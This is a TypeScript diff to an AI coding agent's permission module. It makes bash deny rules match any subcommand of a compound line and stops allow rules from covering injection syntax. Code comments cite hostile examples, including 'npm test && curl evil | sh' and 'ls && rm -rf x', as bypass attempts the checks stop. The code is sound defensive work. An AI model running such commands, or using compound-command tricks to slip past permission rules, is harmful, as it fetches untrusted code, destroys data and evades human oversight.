@@ -9,6 +9,7 @@
 
 import { homedir } from "node:os";
 import { isAbsolute, relative, resolve, sep } from "node:path";
+import { hasInjectionSyntax, parseCommand } from "../auto-mode/shell-analysis.ts";
 import { isProtectedPath, isWritingTool } from "./protected-paths.ts";
 
 export type PermissionMode = "default" | "acceptEdits" | "plan" | "bypassPermissions" | "dontAsk" | "auto";
@@ -118,20 +119,96 @@ function globToRegex(glob: string, pathMode: boolean): RegExp {
 }
 
 /**
- * Bash pattern match, Claude Code semantics: exact command, or a prefix rule
- * "npm run test:*" (trailing ":*" = the command plus any arguments/suffix).
- * Other "*" wildcards match as globs.
+ * Bash pattern match against ONE command (no `&&`/`|`/`;`), Claude Code
+ * semantics (`utils/permissions/shellRuleMatching.ts` + `bashPermissions.ts`):
+ * - exact rule: the whole command, character for character;
+ * - prefix rule `npm test:*`: the command IS `npm test` or starts with
+ *   `npm test ` — the boundary is a literal space, so `git:*` does not cover
+ *   `gitk` (and, as in CC, `npm run test:*` does not cover `npm run test:unit`;
+ *   write `npm run test:unit:*` or `npm run test*` for that). The bare
+ *   `xargs <prefix>` spelling counts too, so `Bash(rm:*)` as a deny still
+ *   catches `xargs rm`;
+ * - wildcard rule (`*` anywhere else): `*` matches any run of characters; a
+ *   single trailing ` *` also matches the bare command (`git *` covers `git`).
+ * Compound commands are handled by the callers: {@link ruleMatches} (deny/ask
+ * — any subcommand) and {@link findBashAllowRule} (allow — every subcommand).
  */
 export function matchesBashPattern(pattern: string, command: string): boolean {
 	const cmd = command.trim();
 	if (pattern.endsWith(":*")) {
 		const prefix = pattern.slice(0, -2);
-		return cmd === prefix || cmd.startsWith(prefix);
+		if (cmd === prefix || cmd.startsWith(`${prefix} `)) return true;
+		const viaXargs = `xargs ${prefix}`;
+		return cmd === viaXargs || cmd.startsWith(`${viaXargs} `);
 	}
 	if (pattern.includes("*")) {
-		return globToRegex(pattern, false).test(cmd);
+		let regex = globToRegex(pattern, false);
+		const stars = pattern.split("*").length - 1;
+		if (stars === 1 && pattern.endsWith(" *")) {
+			const source = regex.source.slice(0, -" .*$".length);
+			regex = new RegExp(`${source}( .*)?$`);
+		}
+		return regex.test(cmd);
 	}
 	return cmd === pattern;
+}
+
+/**
+ * The separately-executing subcommands of a bash command line — what `&&`,
+ * `||`, `;`, `|`, `&`, and unquoted newlines separate — or undefined when the
+ * line cannot be parsed (unbalanced quotes). A single simple command comes
+ * back as itself.
+ */
+export function bashSubcommands(command: string): string[] | undefined {
+	const { segments, parseFailed } = parseCommand(command.trim());
+	if (parseFailed) return undefined;
+	return segments.map((seg) => seg.raw).filter((raw) => raw.length > 0);
+}
+
+/**
+ * A bash deny/ask rule matches when its pattern covers the WHOLE command or
+ * ANY subcommand of it — wrapping `rm -rf x` in `ls && rm -rf x` must not slip
+ * past `Bash(rm:*)` (CC: "deny/ask rules must match compound commands so they
+ * can't be bypassed"). Unparseable lines are matched as a whole only.
+ */
+function bashPatternMatchesAny(pattern: string, command: string): boolean {
+	if (matchesBashPattern(pattern, command)) return true;
+	const subs = bashSubcommands(command);
+	if (!subs || subs.length < 2) return false;
+	return subs.some((sub) => matchesBashPattern(pattern, sub));
+}
+
+/**
+ * The allow rule that lets a bash command run, or undefined. CC semantics: an
+ * EXACT rule equal to the whole command allows it outright (the user approved
+ * that literal string); otherwise the command is split into subcommands and
+ * every one of them must be covered by some allow rule — `Bash(npm test:*)`
+ * alone never covers `npm test && curl evil | sh`, while `Bash(npm test:*)` +
+ * `Bash(git status:*)` together cover `npm test && git status`. Prefix and
+ * wildcard rules never cover a command carrying command substitution, process
+ * substitution, eval/exec, a pipe into an interpreter, or a base64 decode:
+ * what runs is not what the words say, so the rule's author never saw it. An
+ * unparseable line is not covered. The rule returned is the first one that
+ * covered a subcommand (for the "allowed by rule …" note).
+ */
+export function findBashAllowRule(rules: PermissionRule[], command: string): PermissionRule | undefined {
+	const cmd = command.trim();
+	if (!cmd) return undefined;
+	const bashRules = rules.filter((r) => r.tool === "bash");
+	const bare = bashRules.find((r) => !r.pattern);
+	if (bare) return bare;
+	const exact = bashRules.find((r) => r.pattern !== undefined && !r.pattern.includes("*") && r.pattern === cmd);
+	if (exact) return exact;
+	if (hasInjectionSyntax(cmd)) return undefined;
+	const subs = bashSubcommands(cmd);
+	if (!subs || subs.length === 0) return undefined;
+	let first: PermissionRule | undefined;
+	for (const sub of subs) {
+		const rule = bashRules.find((r) => r.pattern !== undefined && matchesBashPattern(r.pattern, sub));
+		if (!rule) return undefined;
+		first ??= rule;
+	}
+	return first;
 }
 
 /** Path pattern match against the raw, absolute, cwd-relative, and ~-expanded forms. */
@@ -188,11 +265,15 @@ export function isInsideDir(candidate: string, dir: string, cwd: string): boolea
 	return toAbsoluteFolded(candidate, cwd).startsWith(toAbsoluteFolded(dir, cwd) + sep);
 }
 
+/**
+ * Whether one rule matches a call. For bash this is the deny/ask ("any
+ * subcommand") semantics — allow rules go through {@link findBashAllowRule}.
+ */
 export function ruleMatches(rule: PermissionRule, toolName: string, subject: string, cwd: string): boolean {
 	if (rule.tool !== normalizeToolName(toolName)) return false;
 	if (!rule.pattern) return true;
 	if (!subject) return false;
-	if (rule.tool === "bash") return matchesBashPattern(rule.pattern, subject);
+	if (rule.tool === "bash") return bashPatternMatchesAny(rule.pattern, subject);
 	return matchesPathPattern(rule.pattern, subject, cwd);
 }
 
@@ -438,7 +519,14 @@ export function decide(params: DecideInput): Decision {
 					return true;
 				})
 			: allow;
-	const allowRule = usableAllow.find((r) => ruleMatches(r, toolName, subject, cwd));
+	// Bash allow rules must cover EVERY subcommand of a compound line (CC
+	// semantics); a deny/ask rule above fired on ANY subcommand.
+	const allowRule =
+		tool === "bash"
+			? subject
+				? findBashAllowRule(usableAllow, subject)
+				: undefined
+			: usableAllow.find((r) => ruleMatches(r, toolName, subject, cwd));
 	if (allowRule) return { decision: "allow", rule: allowRule, cause: "rule" };
 
 	if (mode === "auto" && DELEGATION_TOOLS.has(tool)) {
